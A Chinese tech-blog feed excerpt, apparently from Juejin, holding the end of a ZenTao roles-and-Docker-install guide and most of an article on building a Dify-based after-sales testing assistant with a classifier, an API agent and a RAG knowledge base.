<li>使用禅道进行需求评审、优先级排序，并与项目经理和开发团队紧密协作，确保需求得到准确理解和实现。</li>
</ol>
</li>
<li>
<p>项目经理：</p>
<ol>
<li>在禅道中创建项目，关联产品需求，制定项目计划和里程碑。</li>
<li>分配任务给开发团队，跟踪项目进度，确保项目按计划推进。</li>
<li>组织项目会议，如每日站立会议、迭代回顾会议等，与团队成员保持紧密沟通。</li>
</ol>
</li>
<li>
<p>开发人员：</p>
<ol>
<li>在禅道中领取任务，记录任务执行状态，管理指向自己的缺陷（Bug）状态。</li>
<li>与测试团队紧密协作，及时修复缺陷，确保软件质量。</li>
</ol>
</li>
<li>
<p>测试人员：</p>
<ol>
<li>在禅道中创建测试用例，执行测试任务，记录和跟踪缺陷。</li>
<li>编写测试报告，为项目质量提供数据支持。</li>
<li>与开发团队紧密协作，确保缺陷得到及时修复和验证。</li>
</ol>
</li>
<li>
<p>文档管理员：</p>
<ol>
<li>在禅道中管理项目文档库，整理和共享项目过程中产生的各类文档。</li>
<li>确保团队成员能够方便地获取所需文档，支持项目工作的顺利进行。</li>
</ol>
</li>
</ol>
<h3 data-id="heading-3">docker 安装</h3>
<pre><code class="hljs language-cmd" lang="cmd">docker pull easysoft/zentao:12.3.3 
</code></pre>
<blockquote>
<p>创建容器</p>
</blockquote>
<ul>
<li>--privileged -it 提升权限，有风险</li>
<li>访问的端口号为8001</li>
<li>该容器中内置了mysql数据库，需要单独设置一个密码</li>
</ul>
<p>启动容器成功后，可以在页面中直接访问禅道，访问地址：<a href="https://link.juejin.cn?target=http%3A%2F%2Fip%3A8001%25E5%258D%25B3%25E5%258F%25AF" target="_blank" title="http://ip:8001%E5%8D%B3%E5%8F%AF" ref="nofollow noopener noreferrer">http://ip:8001即可</a></p>
<pre><code class="hljs language-cmd" lang="cmd">docker run -d --name zentao -p 8001:80  -v D:/docker_config/chan_dao/zentaopms:/www/zentaopms -v D:/docker_config/chan_dao/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=admin123 -d easysoft/zentao:12.3.3
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI赋能售后测试：从“黑盒”到“智能伙伴”]]></title>    <link>https://juejin.cn/post/7603142147642736683</link>    <guid>https://juejin.cn/post/7603142147642736683</guid>    <pubDate>2026-02-05T09:35:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147642736683" data-draft-id="7602996277665333302" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI赋能售后测试：从“黑盒”到“智能伙伴”"/> <meta itemprop="keywords" content="Cursor"/> <meta itemprop="datePublished" content="2026-02-05T09:35:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="转转技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI赋能售后测试：从“黑盒”到“智能伙伴”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    转转技术团队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:35:34.000Z" title="Thu Feb 05 2026 09:35:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">一、项目推进与合作中的三大核心痛点的解决</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1. 逻辑不透明 → 智能逻辑解析</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2. 数据构造繁琐 → 场景化构造推荐</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3. 规则同步滞后 → 实时规则查询与解释</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">二、AI智能助手，如何改变现状？</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">✅ 业务问题实时解答</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">✅ 开发与测试高效支持</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">✅ 服务两类用户群体</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">三、为什么选择Dify？</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">四、dify智能助手搭建实现</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">五、已实现场景演示</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">📌 场景一：售后单实时状态查询</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">📌 场景二：基于单号的业务逻辑追问</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">📌 场景三：数据构造指导</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">📌 场景四：无单号纯逻辑答疑</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">六、效果已现，优化持续</a></p>
</li>
</ul>
<p>售后系统长期以来像是企业内部的“黑盒”——流程复杂、信息分散、逻辑交叉，业务部门在项目推进中常面临三重阻力：</p>
<p><strong>逻辑理解难</strong>：不同售后场景命中条件错综复杂，人工排查效率低下；</p>
<p><strong>数据构造繁</strong>：测试验证时缺乏标准构造指引，依赖经验试错，周期冗长；</p>
<p><strong>规则响应慢</strong>：跨部门协作中，规则解释依赖人工沟通，信息同步不及时。</p>
<p>这不仅拖慢了项目节奏，更让内部协作陷入“等人、问人、找人”的循环。</p>
<p>为此，我们推出基于Dify平台构建的<strong>售后业务智能助手</strong>，聚焦<strong>逻辑梳理、数据构造、规则同步</strong>三大场景，将“黑盒”变为“透明工作台”，为项目协作与测试验证提供智能支持。</p>
<h2 data-id="heading-0">一、项目推进与合作中的三大核心痛点的解决</h2>
<h3 data-id="heading-1">1. 逻辑不透明 → 智能逻辑解析</h3>
<p>系统可自动解析不同售后流程的命中规则与判定逻辑，为业务决策和项目对齐提供清晰依据。</p>
<h3 data-id="heading-2">2. 数据构造繁琐 → 场景化构造推荐</h3>
<p>提供常见测试场景的标准化数据构造方案，附示例参数与操作链接，提升测试效率与准确性。</p>
<h3 data-id="heading-3">3. 规则同步滞后 → 实时规则查询与解释</h3>
<p>业务规则与流程说明实时可查，支持自然语言提问，减少跨团队沟通成本与信息误差。</p>
<h2 data-id="heading-4">二、AI智能助手，如何改变现状？</h2>
<h3 data-id="heading-5">✅ 业务问题实时解答</h3>
<p>● 无法申请售后？【提供】一键排查原因</p>
<p>● 流程命中逻辑不清晰？【提供】自动说明规则</p>
<p>● 质检责任认定模糊？【提供】明确判定依据与流程选择</p>
<p>● 散货交接后去哪质检？【提供】智能推荐仓库与站点</p>
<h3 data-id="heading-6">✅ 开发与测试高效支持</h3>
<p>● 提供各类订单构造方法与示例</p>
<p>● 实时查询售后类型与节点数据</p>
<p>● 数据构造后，自动给出下一步操作建议指向</p>
<h3 data-id="heading-7">✅ 服务两类用户群体</h3>
<p>● 内部团队：提升协作效率，释放人力</p>
<p>● 业务合作方：提供标准化、即时化的解答支持</p>
<h2 data-id="heading-8">三、为什么选择Dify？</h2>
<p>在评估多种实现方案后，我们最终选用Dify平台，主要因为：</p>
<p>● 低门槛可视化搭建：无需代码即可配置工作流，快速迭代</p>
<p>● 内置AI核心模块：知识库、意图识别、对话管理开箱即用</p>
<p>● 灵活扩展性强：支持连接外部接口（MCP），获取实时业务数据</p>
<p>● dify可提供机器人会话工作流程搭建</p>
<h2 data-id="heading-9">四、dify智能助手搭建实现</h2>
<p>整体设计思路：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13442b49d4bf4992976cae75982567d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=pmXQZeuUZ%2F%2FoaTgGgikjvJ95mPM%3D" alt="" loading="lazy"/></p>
<p>智能助手并非简单问答机器人，而是通过多层AI节点协同工作，核心利用节点设计如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d456f6e2943e46cb8604b49772f1fc65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=fme6m%2F9H8OTXtkYB1jjKw%2Bl057k%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>参数提取器</strong>：自动识别售后单号等关键信息</li>
</ol>
<p>从用户问题中提取关键参数，例如售后单ID等。当用户提问涉及具体业务单据时，系统自动提取标识信息，供后续节点调用。</p>













<table><thead><tr><th>dify配置</th><th>应用</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc7e18b92f9486bba250f95026c30ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=B4nPvFr0WNkK1Km8xKcdK63NabM%3D" alt="" loading="lazy"/>指令即是提示词</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f72fd850c184677b2c98c1833cc5e33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=vP2j4qKnxwERE7EIXtIfPnSnPNc%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="2">
<li><strong>Agent智能代理</strong>：调用真实业务接口，获取实时数据</li>
</ol>
<p>负责调用外部接口获取实时业务数据，并对返回结果进行结构化解析。例如，根据售后单ID查询详情，并提取状态、处理人、时间等关键字段，转化为自然语言描述。</p>













<table><thead><tr><th>配置</th><th>应用</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d95a50131bef46a0a90548f517eeb592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ib18nlkX%2FF5Uc0%2BKTRng%2Bl8N3Zs%3D" alt="" loading="lazy"/> 指令即是提示词</td><td>原有接口返回结构<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2941b48feacd4d9898c6ca80850096fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=H%2BGbvrwBuce4MulJ43LdWHRDdYw%3D" alt="" loading="lazy"/>提示词后返回结构<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6701a3c8df846ed8cf4d5112b4e5a91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XZRJv3xhTJHe3viAYgiPXKoxgBo%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="3">
<li><strong>问题分类器</strong>：将问题分为规则类、流程类、数据构造类</li>
</ol>
<p>根据问题类型将用户输入分流至不同的处理流程。我们将问题分为以下几类：</p>
<p>● 业务规则类（需检索知识库）</p>
<p>● 流程指引类（需组合逻辑说明）</p>
<p>● 数据构造类（需推荐构造方案）</p>
<p>分类后，系统可调用相应的提示词模板与处理逻辑，提升回答准确性。</p>













<table><thead><tr><th>配置</th><th>应用</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b1f61f600d84bd3a717d6447c135a0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ZMjnIlP1LAWJFGuWcyKAuzD9Rs0%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/988e581c8ced45c090f1c3977b9852eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=xqRakHcqR602DfUfptg6ZTZcnpk%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="4">
<li><strong>知识库（RAG）</strong> ：沉淀业务文档、FAQ、流程说明，精准检索</li>
</ol>
<p>用于存储业务文档、流程说明、常见问题等知识内容。便于。系统根据用户问题从知识库中检索匹配相关内容，作为生成回答的依据。</p>




















<table><thead><tr><th/><th>配置</th><th>应用</th></tr></thead><tbody><tr><td>知识库数据内容</td><td>知识库上传提供了很多文件格式、切片格式（切片：Dify知识库切片是指将上传到Dify平台的知识库文档按一定规则分割成更小、更易管理的内容块（称为“chunks”）的过程。这些切片是知识库检索和应用的基础单元，便于AI模型在生成回答时精准引用相关信息。‌） 文件：<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8e63b3300504fe7a9e0cdba5b55d8e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=5UqEQsEg%2BCBeWKVJYlUWHGYnOLE%3D" alt="" loading="lazy"/> 切片格式：可有多个选择<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862d9ec5876e4164b644f9710fa85c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=ly3y4ZoMJyFV0bIYu6noZTY0yN4%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31d1bd9474764f188597dd47f42beae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XQFt6J%2BZNsOFeYwEXMmWpmupvF8%3D" alt="" loading="lazy"/></td><td/></tr><tr><td>RAG获取</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6176e42cf58744919a79994c70f598b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=xekUggToeD8p7bKuq3LMHs8GgPs%3D" alt="" loading="lazy"/>通过预览可查看效果 <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da15dcb4a9e542868be411416afbcd92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=j%2Bsqjuh9fGZrLwOQfRf2ylWn9pc%3D" alt="" loading="lazy"/> 方式一：直接获取 按切片匹配排序<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e65c462758114b1fb3a3207c68f60d3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=maUO%2B8j139K4yb5g%2FFfwOqir4ao%3D" alt="" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/beefe21418174fa689c462fbdc002959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=Ar3x%2BUnOK9DBlJKVQMU%2B5eLNNfc%3D" alt="" loading="lazy"/> 方式二：大模型提示词匹配<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1735fe4c9da4440880aacb4bba077e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=VmM8r9UNgY6p7T1BfdxVjiANstg%3D" alt="" loading="lazy"/> <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e7b8af2d6d940a1981a85842e4dc0ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=0Gu3Ee9qLlOXhhsR%2FoKsGNiymk8%3D" alt="" loading="lazy"/> 由于大模型分析时间较长，且我们知识库信息也比较全面的情况下就采取匹配返回即可</td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b05baa9410f645d59378caf1ed880688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=1Gz8SG2FMOli1Z74rWeHhmpzZbc%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>知识库内容结构实现</p>
<p>● 数据构造知识库</p>













<table><thead><tr><th>结构</th><th>示例</th></tr></thead><tbody><tr><td>场景 描述+链接 步骤对应状态：<strong>用来匹配数据构造</strong> 入参介绍：<strong>用来推荐参数取值</strong> 方式：统计目前常用数据构造场景整合输出 <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/944aa66af3b44eed9ce5588cb00fc8ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=0jx80rjjNAgSGakrRP0qKqY5Hmk%3D" alt="" loading="lazy"/></td><td><strong>使用场景</strong>: 退货退款-揽收极速退 关键数据构造链接: <a href="https://link.juejin.cn?target=https%3A%2F%2Fqe.*****.com%2FdataPt%2FsceneList%2F20570781%2F528%3FdId%3D7700" target="_blank" title="https://qe.*****.com/dataPt/sceneList/20570781/528?dId=7700" ref="nofollow noopener noreferrer">退货退款-揽收极速退 数据构造链接</a> 此链接用于创建和管理退货案例 <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e63757463740453a9a00df3e698e33f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XrvRIISDAWvfFM3cbM1eUQKBhPw%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<p>● 业务知识库</p>













<table><thead><tr><th>结构</th><th>示例</th></tr></thead><tbody><tr><td>功能概述 逻辑整理 方式：可利用Cursor阅读技术方法，来分析逻辑输出 <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5ef939264354022b0e9cb0cf05e9efc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=MqSdEzVVkVrgl5xQsrb5UYU7JzE%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e14ee620acd4a398fd5d923cec22429~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=THkyfNt5zRUM0R7cv6C4bB4KQGA%3D" alt="" loading="lazy"/></td></tr></tbody></table>
<ol start="5">
<li><strong>大语言模型节点</strong>：整合信息，生成自然语言回答</li>
</ol>
<p>整合知识库内容、实时数据与用户问题，生成自然语言回答。我们根据场景选择合适的模型，并配置温度、惩罚参数等，以控制回答的准确性与创造性。</p>













<table><thead><tr><th>配置</th><th>应用</th></tr></thead><tbody><tr><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bda6ff8c7e144a1e8f71b126c5f4a6b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=le%2FKwPIEelDrE6QQjy7p8VeGgYI%3D" alt="" loading="lazy"/>模型选择和参数：模型参数控制响应生成。 温度范围从 0（确定性）到 1（创造性）。 核采样通过概率限制词汇选择。频率惩罚减少重复。存在惩罚鼓励新话题。你也可以使用预设：精确、平衡或创意。  提示词配置：你的界面根据模型类型自适应。聊天模型使用消息角色（系统用于行为，用户用于输入，助手用于示例），而完成模型使用简单的文本续写。 <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22757720c24e4b8fba5bd58ae679acda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=BlNxBdfGI6nA8E7P4suYONIqHqg%3D" alt="" loading="lazy"/></td><td><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff11f99ad98e4b71825b5fca644f58b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888937&amp;x-signature=XcBpPUZRaLiiAxWvlQZFOPHKr0M%3D" alt="" 